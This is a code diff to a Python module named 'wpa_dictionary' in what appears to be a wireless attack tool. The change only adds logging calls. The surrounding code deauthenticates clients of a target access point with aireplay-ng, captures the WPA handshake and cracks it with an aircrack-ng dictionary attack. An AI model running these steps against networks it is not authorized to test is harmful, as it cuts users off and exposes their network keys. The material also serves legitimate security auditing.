@@ -8,6 +8,7 @@ import src.settings as settings
 
 from poormanslogging import info, warn, error
 from src.attacks.base_attack import BaseAttack
+import src.utils.report as report
 
 
 class wpa_dictionary(BaseAttack):
@@ -20,6 +21,7 @@ class wpa_dictionary(BaseAttack):
 							stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
 
 		info("Trying to get the handshake (sending deauthentication packets...)")
+		report.saveLog("Trying to get the handshake (sending deauthentication packets...)")
 		cmd_aireplay = pexpect.spawn('aireplay-ng -0 10 -a {0} {1}'.format(settings.TARGET_BSSID, settings.INTERFACE_MON))
 		time.sleep(10)
 		cmd_aireplay.close()
@@ -35,12 +37,14 @@ class wpa_dictionary(BaseAttack):
 		for line in parse_log_pyrit:
 			if "No valid" in line:
 				warn("We couldn't get the handshake :-(")
+				report.saveLog("We couldn't get the handshake :-(")
 				handshake = False
 		parse_log_pyrit.close()
 		os.remove(settings.LOG_FILE)	
 
 		if handshake != False:
 			info("We have something :-) Making a dictionary attack...")
+			report.saveLog("We have something :-) Making a dictionary attack...")
 			cmd_crack = pexpect.spawn('aircrack-ng -w dictionary_wpa2 PPDRON_attack-01.cap')
 			cmd_crack.logfile = open(settings.LOG_FILE, 'wb')
 			cmd_crack.expect(['KEY FOUND!', 'Failed', pexpect.TIMEOUT, pexpect.EOF])
@@ -57,6 +61,7 @@ class wpa_dictionary(BaseAttack):
 			os.remove(settings.LOG_FILE)
 			if settings.TARGET_KEY is None:
 				warn("Dictionary attack failed!")
+				report.saveLog("Dictionary attack failed!")
 
 	def setup(self):
 		#  Delete old files:
@@ -71,5 +76,6 @@ class wpa_dictionary(BaseAttack):
 		for d in deps:
 			if subprocess.call(["which", d],stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL) != 0:
 				error("Required binary for {bin} not found.".format(bin=d))
+				report.saveLog("Required binary for {bin} not found.".format(bin=d))
 				return False
 		return True
